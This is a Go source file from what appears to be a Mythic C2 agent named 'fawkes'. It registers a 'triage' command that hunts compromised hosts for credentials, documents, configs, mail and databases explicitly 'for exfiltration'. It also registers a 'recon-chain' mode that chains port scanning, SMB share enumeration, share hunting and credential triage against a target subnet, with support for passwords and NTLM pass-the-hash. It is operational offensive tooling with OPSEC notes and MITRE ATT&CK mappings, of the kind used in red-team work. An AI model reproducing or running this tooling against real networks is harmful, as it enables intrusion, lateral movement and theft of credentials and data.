package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(triageCommand())
}

// triageResult represents a single file discovery result from triage output.
type triageResult struct {
	Path     string `json:"path"`
	Category string `json:"category"`
}

// parseTriageResults parses triage JSON output into a list of file results.
func parseTriageResults(responseText string) []triageResult {
	if responseText == "" || responseText == "[]" {
		return nil
	}
	var results []triageResult
	if err := json.Unmarshal([]byte(responseText), &results); err != nil {
		return nil
	}
	return results
}

// triageOPSECMessage generates the OPSEC warning message for triage actions.
func triageOPSECMessage(action, target string) string {
	if action == "recon-chain" {
		return fmt.Sprintf("OPSEC WARNING: Recon Chain will execute a multi-step automated reconnaissance sequence against %s: (1) port scan, (2) SMB share enumeration, (3) share file hunting, (4) local credential triage. This generates significant network traffic and multiple authentication events. Each step creates visible artifacts (SYN scans, SMB sessions, file access logs). The combined footprint is substantially higher than any single command.", target)
	}
	return "OPSEC WARNING: System triage performs broad enumeration (processes, services, network, users, installed software, scheduled tasks). Aggregated system interrogation may trigger behavioral analytics for automated reconnaissance."
}

// validateReconChainParams checks if recon-chain parameters are valid.
func validateReconChainParams(target, ports string) string {
	if target == "" {
		return "recon-chain requires -target parameter (e.g., 192.168.1.0/24)"
	}
	return ""
}

func triageCommand() agentstructs.Command {
	return agentstructs.Command{
		Name: "triage",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "triage_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Find high-value files for exfiltration — documents, credentials, configs, databases, scripts, archives, or custom path scan (T1083, T1005)",
		HelpString:          "triage -action <all|documents|credentials|configs|database|scripts|archives|mail|recent|custom> [-path /opt/app] [-hours 24] [-max_size 10485760] [-max_files 200]",
		Version:             4,
		SupportedUIFeatures: []string{"file_browser:list"},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1083", "T1005"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"reconPortscanDone":  reconPortscanDone,
			"reconSMBDone":       reconSMBDone,
			"reconShareHuntDone": reconShareHuntDone,
			"reconTriageDone":    reconTriageDone,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "documents", "credentials", "configs", "database", "scripts", "archives", "mail", "recent", "custom", "recon-chain"},
				Description:      "Triage mode: all (docs+creds+configs), documents, credentials, configs, database, scripts, archives, mail, recent, custom. recon-chain: automated network recon — portscan → smb shares → share_hunt → triage (requires target param)",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "path",
				ModalDisplayName: "Custom Path",
				CLIName:          "path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Directory to scan (required for 'custom' action)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "hours",
				ModalDisplayName: "Hours (recent)",
				CLIName:          "hours",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Time window in hours for 'recent' action (default: 24)",
				DefaultValue:     24,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "max_size",
				ModalDisplayName: "Max File Size",
				CLIName:          "max_size",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Maximum file size in bytes (default: 10MB)",
				DefaultValue:     10485760,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "max_files",
				ModalDisplayName: "Max Files",
				CLIName:          "max_files",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Maximum number of files to return (default: 200)",
				DefaultValue:     200,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:                 "target",
				ModalDisplayName:     "Target (recon-chain)",
				CLIName:              "target",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "Target hosts/subnet for recon-chain (e.g., 192.168.1.0/24, 10.0.0.1-10)",
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                 "username",
				ModalDisplayName:     "Username (recon-chain)",
				CLIName:              "username",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "Username for SMB/share enumeration in recon-chain",
				DefaultValue:         "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				ModalDisplayName: "Password (recon-chain)",
				CLIName:          "password",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Password for SMB authentication in recon-chain",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				ModalDisplayName: "NTLM Hash (recon-chain)",
				CLIName:          "hash",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "NTLM hash for pass-the-hash in recon-chain (LM:NT format)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "ports",
				ModalDisplayName: "Ports (recon-chain)",
				CLIName:          "ports",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Ports to scan in recon-chain (default: 445,139,80,443,22,3389,5985)",
				DefaultValue:     "445,139,80,443,22,3389,5985",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			target, _ := taskData.Args.GetStringArg("target")
			msg := triageOPSECMessage(action, target)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok {
				return response
			}
			results := parseTriageResults(responseText)
			if len(results) == 0 {
				return response
			}
			categories := map[string]int{}
			for _, r := range results {
				categories[r.Category]++
			}
			for cat, count := range categories {
				createArtifact(processResponse.TaskData.Task.ID, "File Discovery",
					fmt.Sprintf("Triage: %d %s files discovered", count, cat))
			}
			return response
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Triage collection completed. Automated collection generates significant I/O across multiple data sources. Subtask chains create visible Mythic UI activity.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")

			// recon-chain: sequential chain portscan → smb shares → share_hunt → triage
			if action == "recon-chain" {
				target, _ := taskData.Args.GetStringArg("target")
				if errMsg := validateReconChainParams(target, ""); errMsg != "" {
					response.Success = false
					response.Error = errMsg
					return response
				}

				ports, _ := taskData.Args.GetStringArg("ports")
				if ports == "" {
					ports = "445,139,80,443,22,3389,5985"
				}

				display := fmt.Sprintf("Recon Chain: %s (ports: %s)", target, ports)
				response.DisplayParams = &display

				// Store chain context in Stdout so completion functions can access it
				username, _ := taskData.Args.GetStringArg("username")
				password, _ := taskData.Args.GetStringArg("password")
				hash, _ := taskData.Args.GetStringArg("hash")
				chainCtx, _ := json.Marshal(map[string]string{
					"target":   target,
					"ports":    ports,
					"username": username,
					"password": password,
					"hash":     hash,
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Step 1: Create portscan subtask
				callbackFunc := "reconPortscanDone"
				subtaskResult, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "port-scan",
						Params:                  fmt.Sprintf(`{"hosts":"%s","ports":"%s"}`, target, ports),
					},
				)
				if err != nil || !subtaskResult.Success {
					errMsg := "Failed to create portscan subtask"
					if err != nil {
						errMsg = fmt.Sprintf("Failed to create portscan subtask: %s", err.Error())
					}
					response.Success = false
					response.Error = errMsg
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					fmt.Sprintf("Recon Chain started: portscan %s → smb shares → share_hunt → triage", target))
				return response
			}

			display := fmt.Sprintf("System triage (%s)", action)
			response.DisplayParams = &display
			return response
		},
	}
}
